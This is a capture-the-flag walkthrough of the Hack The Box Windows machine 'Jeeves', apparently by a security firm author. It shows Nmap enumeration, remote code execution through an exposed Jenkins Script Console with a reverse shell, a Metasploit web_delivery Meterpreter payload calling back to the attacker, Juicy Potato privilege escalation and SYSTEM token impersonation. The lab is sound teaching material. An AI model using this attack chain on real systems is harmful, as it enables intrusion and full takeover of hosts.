
# Jeeves — Hack The Box

**By Stager** | FashilHack

---
## What is this machine

Jeeves is a Windows machine from Hack The Box that focuses on:
- Web enumeration
- Exploiting a **Jenkins instance**
- Privilege escalation using **Juicy Potato**
The goal is to go from **web access → shell → SYSTEM**.

---
## Target

```
IP: 10.10.10.63
OS: Windows
```

---

## Step 1 — Nmap Scan

Start with full enumeration:

```bash
nmap -T4 -A 10.10.10.63
```

### Results:

|Port|Service|
|---|---|
|80|HTTP (Microsoft IIS)|
|135|RPC|
|445|SMB|
|50000|Jenkins|

👉 Port **50000** is interesting — commonly used by Jenkins.

---

📸 **Screenshot to add here:**

- Nmap output showing port 50000
    

---

## Step 2 — Web Enumeration

Visit:

```
http://10.10.10.63:50000
```

You’ll find a **Jenkins dashboard**.

Jenkins is often misconfigured and can allow **remote code execution** via Script Console.

---

📸 **Screenshot to add here:**

- Jenkins dashboard
    

---

## Step 3 — Jenkins Script Console → RCE

Navigate to:

```
Manage Jenkins → Script Console
```

This allows execution of Groovy scripts on the server.

---

### Reverse Shell

Use a Jenkins reverse shell script and modify:

- Attacker IP
    
- Port
    

Start listener:

```bash
nc -lvnp 4444
```

Execute the script in Jenkins.

---

### Result:

```bash
whoami
# <low-priv user>
```

You now have **initial shell access** 🎯

---

📸 **Screenshot to add here:**

- Script console execution
    
- Netcat connection received
    

---

## Step 4 — Upgrade to Meterpreter

The shell is limited, so we upgrade it.

---

### Start Metasploit

```bash
msfconsole
```

```bash
use exploit/multi/script/web_delivery
```

Set options:

```bash
set target 2
set payload windows/meterpreter/reverse_tcp
set lhost <YOUR-IP>
set srvhost <YOUR-IP>
run
```

This generates a **PowerShell payload**.

---

### Execute Payload

Paste it into your existing shell.

---

### Result:

```bash
sessions
sessions -i 1
```

✔ Meterpreter session obtained

---

📸 **Screenshot to add here:**

- Meterpreter session active
    

---

## Step 5 — Privilege Escalation Enumeration

Background session:

```bash
background
```

Run:

```bash
use post/multi/recon/local_exploit_suggester
set session 1
run
```

### Result:

- Suggests **Juicy Potato**
    

---

📸 **Screenshot to add here:**

- Exploit suggester output
    

---

## Step 6 — Juicy Potato Exploit

Search:

```bash
search juicy
```

Select module and configure:

```bash
use exploit/windows/local/juicy_potato
set session 1
set lhost <YOUR-IP>
run
```

---

### Result:

New session created:

```bash
sessions -i 2
```

---

## Step 7 — Token Impersonation

Load module:

```bash
load incognito
```

List tokens:

```bash
list_tokens -u
```

If SYSTEM token exists:

```bash
impersonate_token "NT AUTHORITY\\SYSTEM"
```

---

### Verify:

```bash
shell
whoami
```

### Result:

```
nt authority\system
```

🔥 SYSTEM access achieved

---

📸 **Screenshot to add here:**
- Token list
- whoami showing SYSTEM

---

## Step 8 — Flags

### User Flag

```bash
type C:\Users\<user>\Desktop\user.txt
```

---

### Root Flag

```bash
type C:\Users\Administrator\Desktop\root.txt
```

✔ Both flags captured

---

## Full Attack Chain

```
Nmap → Port 50000 (Jenkins)
  ↓
Jenkins Script Console → reverse shell
  ↓
Shell → Meterpreter upgrade
  ↓
Exploit suggester → Juicy Potato
  ↓
Token impersonation → SYSTEM
```

---
## Key Takeaways

**1. Jenkins is a high-value target**  
If Script Console is exposed → instant RCE.

---

**2. Always enumerate unusual ports**  
Port 50000 was the key entry point.

---

**3. Meterpreter improves post-exploitation**  
Much easier to run exploits and manage sessions.

---

**4. Juicy Potato is powerful on Windows**  
Allows privilege escalation via token impersonation.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._